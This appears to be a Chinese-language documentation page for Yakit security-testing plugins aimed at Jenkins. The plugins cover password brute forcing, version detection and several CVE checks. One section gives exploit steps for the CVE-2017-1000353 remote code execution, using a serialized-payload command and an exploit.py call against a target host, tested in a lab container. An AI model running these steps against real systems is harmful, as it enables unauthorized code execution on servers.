---
sidebar_position: 15
---
# Jenkins插件使用

## 1 Jenkins弱口令爆破

**插件id：**

2d0ae8c0-5e91-401d-8892-ab35b98633fc

**测试过程：**

暂无案例

## 2 CVE-2017-1000353 Jenkins-CI 远程代码执行

**插件id：**

Yakit正在努力编写~

**测试过程：**

下载字节码文件 jenkins_poc.ser，下载之后进行编译

```go
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
```

执行python脚本：python exploit.py http://xx.xx.xx.xx:8080 jenkins_poc.ser
查看docker容器内部发现命令已经成功执行

![](/img/products/yakit/Jenkins-1.png)

## 3 Jenkins 漏洞批量检测

**插件id：**

5fcbee22-469d-46fd-97dd-cbf06c7c960f

**测试过程：**

访问测试网站

![](/img/products/yakit/Jenkins-2.png)

加载测试插件（添加ip地址＋端口）
插件成功检测出该漏洞

![](/img/products/yakit/Jenkins-3.png)

## 4 Jenkins CVE-2016-0792 漏洞检测

**插件id：**

29b67ceb-88b7-4ee9-9a1b-87ea39ae3195

**测试过程：**

加载测试插件（添加ip地址＋端口）
插件成功检测出该漏洞

![](/img/products/yakit/Jenkins-4.png)

## 5 Jenkins_CVE-2018-1999002任意文件读取漏洞

**插件id：**

29b67ceb-88b7-4ee9-9a1b-87ea39ae3195

**测试过程：**

暂无案例

## 6 Jenkins版本检测

**插件id：**

4c75fe03-0b33-44f3-a9df-24447b95b29d

**测试过程：**

暂无案例
